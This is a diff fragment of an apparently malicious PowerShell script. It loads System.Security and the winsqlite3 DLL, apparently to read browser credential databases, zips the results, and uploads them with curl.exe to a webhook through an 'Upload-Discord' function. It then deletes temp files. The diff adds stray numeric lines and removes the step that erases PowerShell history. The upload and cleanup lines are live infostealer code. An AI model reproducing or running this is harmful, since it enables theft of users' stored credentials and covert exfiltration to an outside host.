@@ -1,6 +1,8 @@
 $d=Add-Type -A System.Security
 $p='public static'
+"1"
 $g=""")]$p extern"
+"2"
 $i='[DllImport("winsqlite3",EntryPoint="sqlite3_'
 $m="[MarshalAs(UnmanagedType.LP"
 $q='(s,i)'
@@ -46,5 +48,5 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 Upload-Discord -file "$env:tmp/$ZIP"
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-Remove-Item (Get-PSreadlineOption).HistorySavePath
+
 
